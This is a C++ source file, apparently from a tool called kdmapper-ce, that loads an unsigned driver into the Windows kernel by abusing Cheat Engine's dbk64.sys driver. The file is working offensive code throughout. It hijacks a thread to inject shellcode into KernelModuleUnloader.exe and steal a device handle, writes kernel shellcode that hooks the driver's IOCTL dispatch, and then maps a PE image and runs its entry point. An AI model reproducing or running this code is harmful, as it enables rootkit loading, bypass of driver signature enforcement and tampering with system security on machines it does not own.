#include "kdmapper_ce.hpp"

PVOID64 kdmapper_ce::pMmGetSystemRoutineAddress = NULL;
PVOID64 kdmapper_ce::pIofCompleteRequest = NULL;

HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {

    // Perform thread hijacking methods on the target process

    HANDLE hDevice = INVALID_HANDLE_VALUE;
    HANDLE threadHijacked = NULL;
    HANDLE targetThread = NULL;
    HANDLE snapshot;
    HANDLE remoteShellcodeBuffer = NULL;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    DWORD targetProcessID = GetProcessId(hTargetProcess);
    SIZE_T shellcode_size = 0;

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetProcessID)
        {

            Log("kdmapper-ce.exe processID:%d TargetThreadID:%d", threadEntry.th32OwnerProcessID, threadEntry.th32ThreadID);

            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    if (targetThread == NULL) {
        Error("OpenThread failed");
        return hDevice;
    }

    // inject shellcode

    shellcode_size = sizeof shellcode_resource::shellcode;

    remoteShellcodeBuffer = VirtualAllocEx(hTargetProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteShellcodeBuffer == NULL) {
        Error("VirtualAllocEx failed");
        return hDevice;
    }

    WriteProcessMemory(hTargetProcess, remoteShellcodeBuffer, shellcode_resource::shellcode, shellcode_size, NULL);

    // hijack the main thread of kernelmoduleunloader

    WOW64_CONTEXT ct32;
    utils::MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };

    ZeroMemory(&ct32, sizeof(PWOW64_CONTEXT));

    Wow64SuspendThread(targetThread);

    ct32.ContextFlags = CONTEXT_CONTROL;
    Wow64GetThreadContext(targetThread, &ct32);

    ct32.Eip = (DWORD)remoteShellcodeBuffer;

    Wow64SetThreadContext(targetThread, &ct32);
    ResumeThread(targetThread);

    Sleep(1000); // 1s

    // search for patterns in kernelmoduleunloader.exe process memory

    utils::MEMORY_PATTERN* tmp_pattern = (utils::MEMORY_PATTERN*)utils::SearchProcessMemoryForPattern(
        hTargetProcess,
        pattern,
        PAGE_READWRITE,
        MEM_COMMIT,
        MEM_PRIVATE
    );

    Log2("pattern: 0x%x, 0x%d, 0x%x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);

    if (tmp_pattern->marks == 0x12345678 && tmp_pattern->marks2 == 0x12345678) {
        hDevice = (HANDLE)tmp_pattern->handle;
    }

    return hDevice;
}

HANDLE kdmapper_ce::GetDbk64DeviceHandle()
{
    HANDLE hDbk64 = INVALID_HANDLE_VALUE;
    HANDLE hKernelModuleUnloader = INVALID_HANDLE_VALUE;
    HANDLE hOriginalDbk64 = INVALID_HANDLE_VALUE;

    hKernelModuleUnloader = utils::CreateKernelModuleUnloaderProcess();
    if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
        Error("CreateKernelModuleUnloaderProcess failed");
        return hDbk64;
    }

    // drop kernelmoduleunloader.exe.sig into the %temp% folder

    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe.sig", kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig, sizeof(kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig));

    // Inject the shellcode into the KernelModuleUnloader.exe process to get the device handle of dbk64.sys.

    hOriginalDbk64 = GetDbk64DeviceHandleByInjection(hKernelModuleUnloader);
    if (hOriginalDbk64 == INVALID_HANDLE_VALUE || hOriginalDbk64 == NULL || hOriginalDbk64 == (HANDLE)0xffffffff) {
        Error("GetDbk64DeviceHandleByInjection failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }
    
    // Convert a handle obtained by kernelmoduleunloader into a handle that can be used by kdmapper-ce

    if (!DuplicateHandle(hKernelModuleUnloader, hOriginalDbk64, GetCurrentProcess(), &hDbk64, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
        Error("DuplicateHandle failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    Log("Duplicated Dbk64.sys handle: 0x%d (original: 0x%d)", hDbk64, hOriginalDbk64);

    // Close process and process handles. 

    TerminateProcess(hKernelModuleUnloader, 0);
    CloseHandle(hKernelModuleUnloader);

    return hDbk64;
}


BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS* exitCode)
{

    BOOL status = FALSE;
    PIMAGE_NT_HEADERS64 ntHeaders = NULL;
    PIMAGE_SECTION_HEADER section = NULL;
    uint32_t ImageSize = 0;
    UINT64 KernelBuf = NULL;
    VOID* SharedBuf = NULL;
    UINT64 Mdl = NULL;
    DWORD_PTR deltaImageBase = NULL;
    uint64_t address_of_entry_point = NULL;
    PCWSTR DriverObjectName = L"\\Driver\\TDLD";

    // Testing the Patched IOCTL routine 
#ifdef _DEBUG
    if (!Dbk64HookedDeviceIoControlTest(dbk64_device_handle, L"MmGetSystemRoutineAddress")) {
        Error("DeviceIoControlTest failed");
        return FALSE;
    }
#endif // _DEBUG

    do {

      // .sys ファイルをパース

        ntHeaders = portable_executable::GetNtHeaders(hDriver);

        if (!ntHeaders) {
            Error("Invalid format of PE image");
            break;
        }

        if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            Error("Image is not 64 bit");
            break;
        }

        Log("Validity of the inputted driver: Valid");
        Log("Map the input driver to kernel space...");

        ImageSize = ntHeaders->OptionalHeader.SizeOfImage;

        KernelBuf = AllocateNonPagedMem(dbk64_device_handle, ImageSize);
        if (KernelBuf == NULL) {
            Error("AllocateNoPagedMem failed");
            break;
        }

        // Create an MDL for the buffer allocated above and make it accessible from user space

        if (!CreateSharedMemory(dbk64_device_handle, KernelBuf, (UINT64*)&SharedBuf, &Mdl, ImageSize)) {
            Error("CreateSharedMemory failed");
            break;
        }

        Log2("Shared memory has been created in user space at 0x%p (MDL: 0x%p)", SharedBuf, Mdl);

        // Copy image headers

        memcpy(SharedBuf, (BYTE*)hDriver, ntHeaders->OptionalHeader.SizeOfHeaders);

        // Copy image sections

        section = IMAGE_FIRST_SECTION(ntHeaders);
        for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
        {
            if ((section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
                continue;
            auto sectionDestination = (LPVOID)((DWORD_PTR)SharedBuf + (DWORD_PTR)section->VirtualAddress);
            auto sectionBytes = (LPVOID)((DWORD_PTR)hDriver + (DWORD_PTR)section->PointerToRawData);
            memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
            Log2("Copy section : SectionCount 0x%d 0x%p ", i, sectionDestination);
            section++;
        }

        // Resolve relocs and imports

        deltaImageBase = (DWORD_PTR)KernelBuf - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
        portable_executable::RelocateImageByDelta(portable_executable::GetRelocs((VOID*)SharedBuf), deltaImageBase);

        if (!ResolveImports(dbk64_device_handle, portable_executable::GetImports(SharedBuf))) {
            Error("Failed to resolve imports");
            break;
        }

        // unmap shared memory

        if (!UnMapSharedMemory(dbk64_device_handle, (UINT64)SharedBuf, Mdl)) {
            Error("UnMapSharedMemory failed");
            break;
        }

        Log2("Successfully removed shared memory from user space...");

        // Call driver entry point

        address_of_entry_point = (uint64_t)KernelBuf + ntHeaders->OptionalHeader.AddressOfEntryPoint;

        Log("Create DriverObjectName : %ls", DriverObjectName);
        if (!kdmapper_ce::CreateDriverObject(dbk64_device_handle, address_of_entry_point, DriverObjectName)) {
            Error("CreateDriverObject failed");
            break;
        }

        status = TRUE;

    } while (FALSE);

    return status;
    
}

BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
{

    BOOL bRc = FALSE;
    SIZE_T shellcodeSize = sizeof(kernel_mode_shellcode_resource::kernel_mode_shellcode);
    VOID* shellcode = (VOID*)kernel_mode_shellcode_resource::kernel_mode_shellcode;
    SIZE_T shellcodeIoctlSize = sizeof(kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl);
    VOID* shellcodeIoctl = (VOID*)kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl;
    PVOID64 kernelShellcodeBuf = NULL;
    KernelPisParameters pisParameters = {};
    PVOID64 ioctlShellcodeBuf = NULL;
    PVOID64 kernelParamAddr = NULL;

    do {

        kdmapper_ce::pMmGetSystemRoutineAddress = ce_driver::GetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
        kdmapper_ce::pIofCompleteRequest = ce_driver::GetSystemProcAddress(dbk64_device_handle, L"IofCompleteRequest");

        if (kdmapper_ce::pMmGetSystemRoutineAddress < (PVOID64)0x7FFFFFFFFFFF || kdmapper_ce::pIofCompleteRequest < (PVOID64)0x7FFFFFFFFFFF)
            break;

        // Place IRP_MJ_DEVICE_CONTROL patch shellcode in kernel space.

        kernelShellcodeBuf = ce_driver::WriteNonPagedMemory(dbk64_device_handle, shellcode, shellcodeSize);
        if (kernelShellcodeBuf == nullptr) {
            Error("WriteNonPagedMemory first shellcode failed");
            break;
        }

        // Place hooked ioctl shellcode in kernel space

        ioctlShellcodeBuf = ce_driver::WriteNonPagedMemory(dbk64_device_handle, shellcodeIoctl, shellcodeIoctlSize);
        if (ioctlShellcodeBuf == nullptr) {
            Error("WriteNonPagedMemory second shellcode failed");
            break;
        }

        // Place PIC arguments in kernel space

        pisParameters.MmGetSystemRoutineAddress = kdmapper_ce::pMmGetSystemRoutineAddress;
        pisParameters.HookFunctionAddress = (LPVOID)ioctlShellcodeBuf;
        pisParameters.dummy = NULL;

        kernelParamAddr = ce_driver::WriteNonPagedMemory(dbk64_device_handle, &pisParameters, sizeof(KernelPisParameters));
        if (kernelParamAddr == nullptr) {
            Error("WriteNonPagedMemory second shellcode param failed");
            break;
        }

        // Execute kernel mode shellcode

        if (!ce_driver::ExecuteKernelModeShellCode(dbk64_device_handle, (UINT64)kernelShellcodeBuf, (UINT64)kernelParamAddr)) {
            Error("ExecuteKernelModeShellCode failed");
            break;
        }

        bRc = TRUE;

    } while (false);

    return bRc;
}

BOOL kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
    for (const auto& current_import : imports) {

        /*ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
        if (!Module) {
#if !defined(DISABLE_OUTPUT)
            Log("Dependency %s wasn't found", current_import.module_name);
#endif
            return false;
        }*/
        for (auto& current_function_data : current_import.function_datas) {
            //uint64_t function_address = GetKernelModuleExport(hDevice, Module, current_function_data.name);
            //TODO: only ntoskrnl is supported
            std::wstring function_name(current_function_data.name.begin(), current_function_data.name.end());
            uint64_t function_address = (uint64_t)GetSystemProcAddress(hDevice, function_name.c_str());

            //uint64_t function_address = MmGetSystemRoutineAddress(hDevice, current_function_data.name);
            Log2("ResolveImports: import %ls (0x%p)", function_name.c_str(), function_address);

            //            if (!function_address) {
            //                //Lets try with ntoskrnl
            //                if (Module != ntoskrnlAddr) {
            //                    function_address = GetKernelModuleExport(hDevice, ntoskrnlAddr, current_function_data.name);
            //                    if (!function_address) {
            //#if !defined(DISABLE_OUTPUT)
            //                        Log("Failed to resolve import %s (%s)", current_function_data.name, current_import.module_name);
            //#endif
                                    //return false;
                               // }
                            //}
                        //}

            * current_function_data.address = function_address;
        }
    }

    return true;
}

PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functionName) {

    auto ioCtlCode = IOCTL_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 functionName;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        (UINT64)functionName
    };


    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    if (bRc)
        return (PVOID)inp.MmGetSystemRoutineAddress;
    else
        return NULL;
}

UINT64 kdmapper_ce::AllocateNonPagedMem(HANDLE hDevice, SIZE_T Size) {

    auto ioCtlCode = IOCTL_ALLOCATEMEM_NONPAGED;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;
    
    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        SIZE_T Size;
    } inp = { 
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        Size 
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(input),
        &bytesReturned,
        NULL
    );

    return inp.MmGetSystemRoutineAddress;
}

BOOL kdmapper_ce::CreateSharedMemory(HANDLE hDevice, UINT64 kernelBuf, UINT64* sharedBuf, UINT64* Mdl, SIZE_T bufSize) {

    auto ioCtlCode = IOCTL_MAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 TargetPID;
        UINT64 address;
        DWORD size;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        GetCurrentProcessId(),
        kernelBuf,
        bufSize
    };

    struct output
    {
        UINT64 MDL;
        UINT64 Address;
    } outp = { 0 };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &outp,
        sizeof(output),
        &bytesReturned,
        NULL
    );

    *sharedBuf = outp.Address;
    *Mdl = outp.MDL;

    return bRc;
}

BOOL kdmapper_ce::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UINT64 Mdl) {

    auto ioCtlCode = IOCTL_UNMAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 MDL;
        UINT64 Address;
    } inp = { 
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        Mdl,
        sharedMemAddress
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}


PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR functionName) {
    auto ioCtlCode = IOCTL_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 functionName;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        (UINT64)functionName
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    if (bRc)
        return (PVOID)inp.MmGetSystemRoutineAddress;
    else
        return FALSE;
}

BOOL kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR driverName) {

    auto ioCtlCode = IOCTL_CREATE_DRIVER;
    DWORD returned;

    struct input
    {
        UINT64 MmGetSystemRoutineAddress;
        UINT64 IofCompleteRequest;
        UINT64 DriverInitialize;
        UINT64 driverName;
    } inp = {
        (UINT64)kdmapper_ce::pMmGetSystemRoutineAddress,
        (UINT64)kdmapper_ce::pIofCompleteRequest,
        EntryPoint,
        (UINT64)driverName
    };

    if (DeviceIoControl(hDevice, ioCtlCode, &inp, sizeof input, nullptr, 0, &returned, nullptr))
        return TRUE;
    else
        return FALSE;

}